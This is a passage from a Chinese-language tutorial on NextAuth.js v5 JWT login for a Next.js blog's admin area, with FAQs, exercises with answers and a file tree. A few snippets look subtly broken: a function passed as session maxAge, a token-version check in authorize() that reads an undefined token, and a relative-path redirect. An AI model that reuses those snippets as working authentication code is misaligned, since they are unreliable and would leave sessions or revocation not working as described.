**本项目选择 JWT**：仅管理员使用，无需频繁撤销 session，性能优先。

---

### Q2: 如何在其他页面获取用户信息？

#### 方法 1: 服务端组件（推荐）

```typescript
import { auth } from '@/auth';

export default async function Page() {
  const session = await auth();

  if (!session) {
    return <div>未登录</div>;
  }

  return <div>欢迎, {session.user.email}</div>;
}
```

#### 方法 2: 客户端组件

```typescript
'use client';
import { useSession } from 'next-auth/react';

export default function Component() {
  const { data: session, status } = useSession();

  if (status === 'loading') {
    return <div>加载中...</div>;
  }

  if (!session) {
    return <div>未登录</div>;
  }

  return <div>欢迎, {session.user.email}</div>;
}
```

**注意**: 客户端组件需要在 `app/layout.tsx` 中包裹 `<SessionProvider>`：

```typescript
import { SessionProvider } from 'next-auth/react';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <SessionProvider>
          {children}
        </SessionProvider>
      </body>
    </html>
  );
}
```

---

### Q3: 如何保护 API 路由？

```typescript
import { auth } from '@/auth';
import { NextResponse } from 'next/server';

export async function GET() {
  // 验证身份
  const session = await auth();

  if (!session) {
    return NextResponse.json(
      { error: '未授权' },
      { status: 401 }
    );
  }

  // 可选：检查角色
  if (session.user.role !== 'admin') {
    return NextResponse.json(
      { error: '权限不足' },
      { status: 403 }
    );
  }

  // 执行业务逻辑...
  return NextResponse.json({ data: '...' });
}
```

---

### Q4: 如何修改 Session 过期时间？

```typescript
// auth.ts
export const authConfig: NextAuthConfig = {
  session: {
    strategy: 'jwt',
    maxAge: 60 * 60,  // 1 小时（秒）
    // maxAge: 30 * 24 * 60 * 60,  // 30 天
    // maxAge: 60 * 60 * 24,        // 24 小时
  },
};
```

---

### Q5: 如何添加"记住我"功能？

```typescript
// login/page.tsx
const [remember, setRemember] = useState(false);

const handleSubmit = async (e) => {
  const result = await signIn('credentials', {
    email,
    password,
    remember,  // 传递到 authorize()
    redirect: false,
  });
};

// auth.ts
async authorize(credentials) {
  // ...验证逻辑...

  // 根据 remember 返回不同的 user 对象
  return {
    id: admin._id.toString(),
    email: admin.email,
    name: admin.name,
    role: admin.role,
    remember: credentials.remember === 'true',
  };
},

callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.remember = user.remember;
    }
    return token;
  },
},

session: {
  strategy: 'jwt',
  // 动态设置过期时间
  maxAge: (session) => {
    return session.remember ? 30 * 24 * 60 * 60 : 24 * 60 * 60;
  },
},
```

---

### Q6: 如何主动撤销 JWT Token？

JWT 本身无法撤销（无状态），但有几种解决方案：

#### 方案 1: 黑名单（数据库）

```typescript
// 创建黑名单表
const RevokedTokenSchema = new mongoose.Schema({
  token: String,
  revokedAt: Date,
});

// 中间件检查黑名单
export default auth(async (req) => {
  if (req.auth) {
    const token = req.cookies['next-auth.session-token'];
    const isRevoked = await RevokedToken.findOne({ token });

    if (isRevoked) {
      return NextResponse.redirect('/login');
    }
  }

  return NextResponse.next();
});
```

#### 方案 2: 缩短过期时间 + Refresh Token

```typescript
session: {
  maxAge: 15 * 60, // 15 分钟短期 Token
},

// 实现 Refresh Token 机制（较复杂）
```

#### 方案 3: 版本号机制

```typescript
// Admin 模型添加 tokenVersion
const AdminSchema = new mongoose.Schema({
  tokenVersion: { type: Number, default: 0 },
});

// 撤销时增加版本号
admin.tokenVersion += 1;
await admin.save();

// JWT 包含版本号
callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.version = user.tokenVersion;
    }
    return token;
  },
},

// 验证时比对版本号
async authorize(credentials) {
  // ...
  if (token.version !== admin.tokenVersion) {
    throw new Error('Token 已失效');
  }
}
```

---

## 六、实验练习

### 练习 1: 修改 Session 过期时间

**任务**: 将 Session 有效期改为 1 小时

<details>
<summary>点击查看答案</summary>

```typescript
// auth.ts
export const authConfig: NextAuthConfig = {
  session: {
    strategy: 'jwt',
    maxAge: 60 * 60, // 1 小时 = 3600 秒
  },
};
```

测试：
1. 登录后，1 小时后刷新页面
2. 应该被自动重定向到登录页
</details>

---

### 练习 2: 添加用户角色权限检查

**任务**: 在中间件中检查用户角色，非 admin 无法访问控制台

<details>
<summary>点击查看答案</summary>

```typescript
// middleware.ts
export default auth((req) => {
  const { pathname } = req.nextUrl;
  const isLoggedIn = !!req.auth;
  const isAdmin = req.auth?.user?.role === 'admin';

  const protectedPaths = ['/dashboard'];
  const isProtectedPath = protectedPaths.some(path =>
    pathname.startsWith(path)
  );

  if (isProtectedPath && !isLoggedIn) {
    return NextResponse.redirect(new URL('/login', req.url));
  }

  // 新增：检查角色
  if (isProtectedPath && isLoggedIn && !isAdmin) {
    return NextResponse.redirect(new URL('/forbidden', req.url));
  }

  return NextResponse.next();
});
```
</details>

---

### 练习 3: 在 JWT 中添加自定义字段

**任务**: 在 JWT Token 中添加 `lastLoginAt` 字段

<details>
<summary>点击查看答案</summary>

```typescript
// auth.ts
callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.id = user.id;
      token.email = user.email;
      token.name = user.name;
      token.role = user.role;

      // 新增：记录登录时间
      token.lastLoginAt = new Date().toISOString();
    }
    return token;
  },

  async session({ session, token }) {
    if (token && session.user) {
      session.user.id = token.id;
      session.user.email = token.email;
      session.user.name = token.name;
      session.user.role = token.role;

      // 新增：传递到 session
      session.user.lastLoginAt = token.lastLoginAt;
    }
    return session;
  },
},

// types/next-auth.d.ts（扩展类型定义）
declare module 'next-auth' {
  interface Session {
    user: {
      id: string;
      email: string;
      name: string;
      role: 'admin';
      lastLoginAt: string; // 新增
    } & DefaultSession['user'];
  }
}
```
</details>

---

### 练习 4: 添加登录尝试次数限制

**任务**: 5 次登录失败后锁定账户 10 分钟

<details>
<summary>点击查看答案</summary>

```typescript
// models/Admin.ts
const AdminSchema = new mongoose.Schema({
  // ... 原有字段
  loginAttempts: { type: Number, default: 0 },
  lockUntil: { type: Date },
});

// 检查是否被锁定
AdminSchema.methods.isLocked = function() {
  return this.lockUntil && this.lockUntil > Date.now();
};

// 增加失败次数
AdminSchema.methods.incLoginAttempts = async function() {
  // 如果之前的锁定已过期，重置计数
  if (this.lockUntil && this.lockUntil < Date.now()) {
    return this.updateOne({
      $set: { loginAttempts: 1 },
      $unset: { lockUntil: 1 },
    });
  }

  const updates = { $inc: { loginAttempts: 1 } };

  // 达到 5 次，锁定 10 分钟
  if (this.loginAttempts + 1 >= 5 && !this.isLocked()) {
    updates.$set = { lockUntil: Date.now() + 10 * 60 * 1000 };
  }

  return this.updateOne(updates);
};

// 重置失败次数
AdminSchema.methods.resetLoginAttempts = async function() {
  return this.updateOne({
    $set: { loginAttempts: 0 },
    $unset: { lockUntil: 1 },
  });
};

// auth.ts
async authorize(credentials) {
  // ...

  const admin = await Admin.findOne({ email });
  if (!admin) {
    throw new Error('邮箱或密码错误');
  }

  // 检查是否被锁定
  if (admin.isLocked()) {
    throw new Error('账户已锁定，请 10 分钟后再试');
  }

  const isValid = await admin.comparePassword(credentials.password);

  if (!isValid) {
    // 增加失败次数
    await admin.incLoginAttempts();
    throw new Error('邮箱或密码错误');
  }

  // 登录成功，重置失败次数
  if (admin.loginAttempts > 0) {
    await admin.resetLoginAttempts();
  }

  return { /* ... */ };
}
```
</details>

---

## 七、学习资源

### 官方文档

- [NextAuth.js v5 文档](https://authjs.dev)
- [Next.js App Router](https://nextjs.org/docs/app)
- [Mongoose 文档](https://mongoosejs.com/docs)
- [bcrypt 文档](https://github.com/kelektiv/node.bcrypt.js)

### 推荐阅读顺序

1. **理解概念**: JWT、Cookie、Session、bcrypt
2. **阅读代码**: `auth.ts` → `middleware.ts` → `login/page.tsx`
3. **追踪流程**: 在浏览器 DevTools 中观察网络请求
4. **修改尝试**: 改变 session 过期时间、添加新字段
5. **实验练习**: 完成上面的 4 个练习

### 调试技巧

1. **启用 NextAuth 调试日志**
   ```typescript
   // auth.ts
   debug: true,
   ```

2. **查看 Cookie**
   - 打开浏览器 DevTools
   - Application → Cookies → localhost
   - 查看 `next-auth.session-token`

3. **解密 JWT**
   - 访问 [jwt.io](https://jwt.io)
   - 粘贴 Token 查看内容

4. **监控网络请求**
   - DevTools → Network
   - 筛选 `/api/auth`
   - 查看请求/响应

---

## 附录：文件结构总览

```
项目根目录
├── auth.ts                          # NextAuth 配置（认证核心）
├── middleware.ts                    # 路由保护
├── .env.local                       # 环境变量
│
├── models/
│   └── Admin.ts                     # 管理员模型（密码哈希）
│
├── types/
│   ├── admin.ts                     # 类型定义
│   └── next-auth.d.ts               # NextAuth 类型扩展
│
├── app/
│   ├── api/
│   │   └── auth/[...nextauth]/      # NextAuth API 路由
│   │       └── route.ts
│   │
│   ├── login/
│   │   └── page.tsx                 # 登录页面（Client Component）
│   │
│   ├── dashboard/                   # 受保护路由
│   │   ├── layout.tsx               # 权限检查
│   │   ├── page.tsx                 # 控制台首页
│   │   ├── rss/
│   │   │   └── page.tsx             # RSS 管理
│   │   ├── guides/
│   │   │   └── page.tsx             # 攻略管理
│   │   └── components/
│   │       ├── DashboardNav.tsx     # 侧边导航
│   │       └── LogoutButton.tsx     # 登出按钮（已弃用）
│   │
│   └── components/
│       ├── Navbar.tsx               # 导航栏（显示登录状态）
│       └── Footer.tsx               # 页脚
│
├── lib/
│   └── mongodb.ts                   # 数据库连接
│
└── scripts/
    ├── create-admin.ts              # 创建管理员脚本（TypeScript）
    └── create-admin.js              # 创建管理员脚本（JavaScript）
```

---

**文档版本**: v1.0
**最后更新**: 2026-02-11
**作者**: Claude (Anthropic)
**项目**: TFT Blog 管理员认证系统


